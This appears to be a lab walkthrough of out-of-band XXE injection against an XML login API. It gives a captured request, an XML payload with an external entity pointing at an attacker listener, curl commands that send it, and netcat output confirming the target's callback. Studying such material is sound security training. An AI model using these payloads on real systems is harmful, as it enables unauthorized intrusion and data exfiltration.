![](11.png)

```http
POST /api/login/ HTTP/1.1
Host: <TARGET IP>:3001
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 111
Origin: http://<TARGET IP>:3001
DNT: 1
Connection: close
Referer: http://<TARGET IP>:3001/
Sec-GPC: 1

<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
```

- We notice that an API is handling the user authentication functionality of the application.
- User authentication is generating XML data

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
<root>
<email>test@test.com</email>
<password>P@ssw0rd123</password>
</root>
```

```sh
nc -nlvp 4444
listening on [any] 4444 ...
```

```sh
$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
<p>Sorry, we cannot find a account with <b></b> email.</p>
```

```sh
$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
```

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
GET / HTTP/1.0
Host: <VPN/TUN Adapter IP>:4444
Connection: close
```